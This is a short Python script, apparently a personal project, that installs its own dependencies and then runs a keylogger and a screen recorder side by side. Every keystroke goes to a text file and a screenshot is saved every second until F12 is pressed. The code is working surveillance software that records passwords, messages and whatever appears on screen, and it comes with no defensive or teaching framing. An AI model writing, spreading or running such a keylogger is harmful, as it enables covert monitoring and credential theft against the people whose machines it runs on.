import subprocess
import sys
import pyautogui
import time
import os
from datetime import datetime
import keyboard
from pynput.keyboard import Listener
import threading

def install_package(package):
    try:
        __import__(package)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_package("pyautogui")
install_package("keyboard")
install_package("pynput")

def ensure_folder_exists(folder_path):
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        print(f"Đã tạo thư mục: {folder_path}")

def capture_screen_continuous():
    print(" F12 dừng chụp")
    folder = 'screenshots'
    ensure_folder_exists(folder)
    try:
        while True:
            screenshot = pyautogui.screenshot()
            now = datetime.now()
            date_time = now.strftime("%Y%m%d-%H%M%S")
            file_path = os.path.join(folder, f"{date_time}.png")
            screenshot.save(file_path)
            print(f"Chụp ảnh và lưu vào {file_path}")
            if keyboard.is_pressed('F12'):
                print("Đã dừng chụp ảnh màn hình.")
                break
            time.sleep(1)
    except Exception as e:
        print(f"Đã xảy ra lỗi: {e}")

def log_keys():
    file_path = "HoangDz.txt"
    folder = os.path.dirname(file_path)
    if folder:
        ensure_folder_exists(folder)
    if not os.path.exists(file_path):
        with open(file_path, "w") as file:
            file.write("")
    def anonymous(key):
        key = str(key).replace("'", "")
        if key == "Key.f12":
            raise SystemExit(0)
        if key in ["Key.ctrl_l", "Key.enter", "Key.alt_l", "Key.tab"]:
            key = "\n"
        with open(file_path, "a") as file:
            file.write(key)
        print(key)
    with Listener(on_press=anonymous) as listener:
        listener.join()

if __name__ == "__main__":
    screen_thread = threading.Thread(target=capture_screen_continuous)
    keylog_thread = threading.Thread(target=log_keys)
    screen_thread.start()
    keylog_thread.start()
    screen_thread.join()
    keylog_thread.join()
#Made By Dong Tran Viet Hoang